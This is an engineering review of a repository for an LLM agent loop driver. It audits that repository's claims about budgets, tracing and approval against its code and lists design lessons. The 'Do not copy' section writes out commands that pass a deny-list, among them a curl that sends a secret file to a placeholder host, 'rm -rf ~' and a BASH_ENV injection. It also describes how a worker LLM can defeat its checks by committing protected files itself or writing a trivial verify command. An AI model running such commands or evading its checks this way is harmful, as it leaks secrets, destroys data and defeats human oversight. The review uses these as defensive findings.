# hhamja/loop-engineering-architecture

Repo paths are relative to `other-solutions/hhamja_loop-engineering-architecture/`. `fw:` means the framework. MIT `LICENSE` read directly (VERIFIED). The repo has no row in `MANIFEST.tsv`, so the license comes from the file alone.

## 1. What it really is

- A personal, four-day experiment (50 commits, 2026-07-04 to 07-07), mostly Korean docs. About 800 lines of working bash: `loop/run.sh` 364, `scripts/check-loop-contract.sh` 157, plus trace, commit and bootstrap helpers. About 820 lines of mock-worker tests. VERIFIED.
- The real product is a driver: PLAN (LLM splits checkboxes into tickets), EXECUTE (LLM does one ticket), VERIFY (contract check plus the ticket's `verify` command), STOP. The worker is any CLI (`WORKER_CMD`). Four real tickets went through it (`state/tasks/done/`). No traces are committed, so those runs cannot be inspected. VERIFIED.
- Most folders are empty scaffolding. `evals/`, `verification/graders/`, `context/*` hold only READMEs or `.gitkeep`. VERIFIED.
- The most interesting design (loopkit: engine/seed split, temp-copy execution, run-start baseline, global gate) is a separate repo not cloned here. I read only its 356-line spec. Items from it are spec-only, not proven. `state/PROGRESS.md:9` records that the local copies vanished from disk and the marketplace install was redone from GitHub.
- README claims the code does not support (VERIFIED):
  - "Turn/token budgets ... *enforced*" (`README.md:31-32`). `max_tokens_per_run` has no reader, and tokens are hardcoded to 0 (`loop/run.sh:77,96`). ADR-004 admits budgets are not enforced (`docs/decisions/ADR.md:46`).
  - `min_grader_score`, `max_tool_retries`, `on_invalid_output`, `require_human_approval` and all of `config/models.yaml` have no reader in `loop/` or `scripts/`.
  - "Maker/checker separation" (`README.md:33`). The checker is a command the same LLM wrote, read from a file the worker can edit, after the worker ran (`loop/run.sh:290,305`).
  - "Phase criteria are the verification rubric" (`docs/architecture.md:32,63`). Nothing reads `docs/phases/` except a dirty check. Neither prompt uses it (`loop/run.sh:104,216`; `prompts/system/*.md`). The objective function is guarded but never evaluated.
  - "Approval cannot be forged" (`docs/architecture.md:63`). This holds only for run.sh's own commits. Check 3 uses `git status`, so a worker that commits `docs/PRD.md` itself passes (`scripts/check-loop-contract.sh:114-119`).
  - "Every turn's tool calls are traced" (`docs/architecture.md:65`). Traces hold orchestrator events only, with `tool_calls: []` (`loop/run.sh:77`). Worker logs are overwritten on retry because the path is set per turn (`loop/run.sh:250-251,174`).

## 3. Challenges

- **A human accepts every ticket.** Repo contradicts. Verdict: repo is right in principle. Approve the objective and let tickets flow. But its own "objective" is disconnected from verification, so the win is only real if the charter feeds the Done Contract. A hybrid is best: charter-covered tickets auto-accept, anything outside or HIGH asks.
- **Review by a second reader.** Repo has none and treats deterministic checks as sufficient. Verdict: framework is right. ADR-004 defers LLM review, and `state/PROGRESS.md:96` admits the verify is a reward-hacking vector. This repo is no evidence that review can go.
- **Three risk lanes.** Repo has one path. Verdict: no evidence either way. One path is simpler, but it has no scope limit at all: `git add -A` commits anything. Keep the lanes until measured.
- **Bash plus files.** Repo agrees, and its history shows the cost: self-modifying scripts, `$var회` crashes, watchdog fd hangs, the `grep -c || echo 0` bug (`state/PROGRESS.md:103,104,107,108`). JSON is built with sed/awk (`loop/run.sh:69-72`). Verdict: fine at 300 lines, doubtful at 1,242. This counts against gate.sh's size, not for it.
- **Tickets as the unit.** Repo agrees, but with a lean envelope: `goal`, `input`, `verify`, and an orchestrator-injected ticket as the whole context. It ignores the worker's self-reported `result` entirely (run.sh never reads it). Verdict: keep the framework's tickets; copy the principle that worker self-report never counts.
- **Directory state and rename claims.** Repo says rename atomicity prevents double claims (`docs/architecture.md:82`). In fact `next_ticket` prefers `doing/` to resume (`loop/run.sh:118-122`), so a second runner re-runs a ticket someone else holds, and rename says nothing across clones. Verdict: framework's `refs/agentic/nn` is the better direction.
- **18 skills, long AGENTS.md.** Repo has 38 lines of AGENTS.md and prompts injected per state (`prompts/system/execute.md`, 28 lines). Verdict: in driver mode, a per-step prompt beats skill discovery; railroaded skills (implement, critic, archive) could shrink to prompts `next` hands out. INFERRED, unmeasured. Note its own audit found core rules copied 3-5 times across docs (`state/PROGRESS.md:89`), so short does not mean clean.
- **One hook set for three tools.** Repo names channels instead. Verdict: repo's framing is better. See git hooks above.
- **A selftest as main proof.** Repo has the same weakness: mock workers, and empty `evals/`. It also has no CI. It does record the "hill-climbing" idea, but none of it exists. Verdict: neither has evidence; do not copy the claim.

## 4. Delete or simplify

- **Dead config.** This repo is what unchecked config becomes: a README that claims enforcement of keys nobody reads. Delete `tracker`, `limits.exception_max_days`, and `models.*` unless applied. Add one `env-lint` check: every key in `config.yml` has a reader.
- **Rule duplication.** Spec decision 22: the rule's home is the engine, and seed docs reference it (`docs/specs/loopkit-plugin.md:55`). Apply this across `AGENTS.md`, `judgment.md` and skills; it also shrinks them.
- **Ship dependency on template docs.** Deleting the ADRs broke ship in the brief's test. Engine must not depend on seed files; that follows directly from the split.
- **`stop_followups: 0`.** Either a working default or remove the hook.
- **The exit-1 double meaning.** Replace with the enum: `next.state` and `failed` become separate.

## 5. Orchestration

- **Standalone and plug-in can share one state machine.** `run.sh` is a thin outer loop; a real orchestrator would replace only that loop. The framework should expose `next --json`, a stable reason enum, and a worker contract, then ship the driver as a small optional file.
- **Exit codes matter.** `run_end` always exits 0, even on `error` or `timeout` (`loop/run.sh:98`). An orchestrator must parse stdout or the trace. Do the opposite: distinct exit codes per reason.
- **Interactive and unattended are different trust modes.** Fail open when a human is watching, never when one is not. The spec keeps this split throughout (decisions 11, 20).
- **Parallel is unsolved here.** Decision 17 only offers a guide (one worktree per run), and `state/PLAN.md` and `PROGRESS.md` are singleton files that diverge across branches. `RUN_ID="r-$$"` (`loop/run.sh:63`) can collide; a failed `checkout -b` then silently commits to the current branch (`:223-228`). Use per-ticket files and uuid run ids. Two sessions colliding in one output directory is recorded as a lesson (`state/PROGRESS.md:85`).
- **Cross-run retry storm.** A blocked ticket goes to `done/` but its PLAN item stays unchecked, so the next run re-plans it (`loop/run.sh:238,339-342`). INFERRED. Under cron this repeats forever. A driver needs a durable blocked marker.

## 6. Do not copy

- **The metacharacter deny-list as a security boundary.** `verify_has_shell_meta` (`loop/run.sh:134-142`) passes `curl -d @/path/secret https://x`, `rm -rf ~`, and `BASH_ENV=f bash t.sh`: no listed character appears (VERIFIED by reading the pattern, not run). ADR-012 admits partial coverage but understates this. It also rejects the repo's own accepted ticket form (`state/tasks/done/task-003.md:23` uses `&&`). Real fix: run checks inside the same sandbox as the worker.
- **Enforcement that diffs against the moving HEAD.** ADR and PRD checks use `git diff HEAD` and `git status` (`check-loop-contract.sh:103,115`). The worker's own commit defeats them. The bug class is identical to the framework's mutable-contract gap.
- **Worker-authored verify, read after the worker ran** (`loop/run.sh:305`). No freezing at all; `verify: true` passes. Worse than the framework. There is no timeout on it either: `bash -c "$verify_cmd"` can hang forever (`:312`), unlike fw `command_timeout_secs`.
- **Auto-push defaults.** `auto_push: true` with `git add -A`, and a Stop hook that pushes (ADR-011). `.gitignore` covers only `.env`. Side effects in a checker break its purity, and a generated secret leaves the machine.
- **PROGRESS-on-every-file-change hook.** Check 1 cannot tell who changed a file, and it repeatedly blocked a read-only audit session (`state/PROGRESS.md:92`). The file grew to 37 KB despite the "snapshot, not append" rule (`docs/architecture.md:98`), and every session loads it. 14 of 50 commits are `chore`, mostly state updates.
- **Prompt-as-installer.** `dist/loop-bootstrap.md` makes an LLM retype 2,412 lines byte-exact with sha256 checks. It is clever and its builder is deterministic (`scripts/build-bootstrap.sh`), but a shell script does this for free. The repo itself moved on to a plugin.
- **Overbuilding the plan.** 50 KB spec, seven review rounds, three parallel implementations, before one real consumer existed (`state/PLAN.md` last item is still unchecked). The empty growth-path folders are the same habit.
- **Suspicious content.** None directed at readers. ADR-012 quotes an example exfiltration payload as a threat description (`docs/decisions/ADR.md:108`). `dist/` tells an LLM to install files without changing them, normal for its purpose but not to be followed by anyone here.

## 7. If you rebuilt the framework

Keep the first-match decision table, gate-owned state, reviewer step and hooks. Change the shape around them: a separate dev repo that builds an `engine/` (overwritten on update, hash-stamped, judged from base, never from the branch under review) and a `seed/` (copied once, project-owned). Add a small optional driver over a JSON `next`, with a one-line worker contract, bounded attempts, a reason enum, a notify seam, and a per-ticket run record committed at close. Move human approval up to a charter on the protected base branch, with tickets inside it auto-accepted. Use git hooks as the tool-neutral layer and agent hooks as extras. Then measure before adding anything.
